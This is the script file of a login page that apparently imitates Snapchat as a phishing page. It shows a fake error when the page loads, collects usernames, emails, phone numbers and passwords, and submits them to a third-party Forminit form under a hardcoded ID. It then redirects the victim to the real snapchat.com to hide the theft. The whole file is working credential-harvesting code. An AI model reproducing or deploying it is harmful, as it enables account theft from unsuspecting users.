//script of login.html file

// Toggle password visibility with dynamic image for show/hide
document.querySelector('.toggle-password').addEventListener('click', function () {
  const passwordField = document.getElementById('password');
  const eyeIcon = document.getElementById('eye-icon');
  
  if (passwordField.type === 'password') {
    passwordField.type = 'text';
    eyeIcon.src = 'img/eye-open.svg';  // Update to the open eye icon
  } else {
    passwordField.type = 'password';
    eyeIcon.src = 'img/eye-closed.svg';  // Update to the closed eye icon
  }
});

// Switch between username/email and phone number
const switchToPhone = document.getElementById('switch-to-phone');
const usernameInput = document.getElementById('username');
const label = document.querySelector('label[for="username"]');

switchToPhone.addEventListener('click', function () {
  if (label.textContent === 'USERNAME OR EMAIL') {
    label.textContent = 'PHONE NUMBER';
    usernameInput.type = 'tel';
    usernameInput.name = 'fi-text-phone';  // Update name for Forminit
    switchToPhone.textContent = 'Use email instead';
  } else {
    label.textContent = 'USERNAME OR EMAIL';
    usernameInput.type = 'text';
    usernameInput.name = 'fi-text-username';  // Update name for Forminit
    switchToPhone.textContent = 'Use phone number instead';
  }
});

// Show error message on page load
window.onload = function() {
  var errorMessage = document.getElementById('error-message');
  errorMessage.style.display = 'block'; // Display the message

  // Hide the error message after user clicks anywhere on the page
  document.body.addEventListener('click', function() {
    errorMessage.style.display = 'none';
  });
};

// Initialize Forminit
const forminit = new Forminit();
const FORM_ID = "a37p6efkswl"; // Your Forminit form ID

// Handle form submission with Forminit
document.getElementById('login-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const passwordInput = document.getElementById('password');
  const incorrectMessage = document.querySelector('.incorrect');
  const loginButton = document.querySelector('.login-button');
  const formData = new FormData(e.target);
  
  // Client-side validation: Check if password is less than 8 characters
  if (passwordInput.value.length < 8) {
    incorrectMessage.style.display = 'block';  // Show error message
    return false;  // Stop submission
  } else {
    incorrectMessage.style.display = 'none';  // Hide error message
  }
  
  // Disable button during submission
  loginButton.disabled = true;
  loginButton.textContent = 'Logging in...';
  
  try {
    const { data, error, redirectUrl } = await forminit.submit(FORM_ID, formData);
    
    if (error) {
      // Show error message
      incorrectMessage.style.display = 'block';
      loginButton.disabled = false;
      loginButton.textContent = 'Log In';
      return;
    }
    
    // Success! Redirect to Snapchat (or use redirectUrl if provided by Forminit)
    if (redirectUrl) {
      window.location.href = redirectUrl;
    } else {
      // Redirect to Snapchat after 1 second (keeping your original behavior)
      setTimeout(function () {
        window.location.href = "https://www.snapchat.com/";
      }, 1000);
    }
    
  } catch (err) {
    // Handle any errors
    incorrectMessage.style.display = 'block';
    loginButton.disabled = false;
    loginButton.textContent = 'Log In';
    console.error('Form submission error:', err);
  }
});
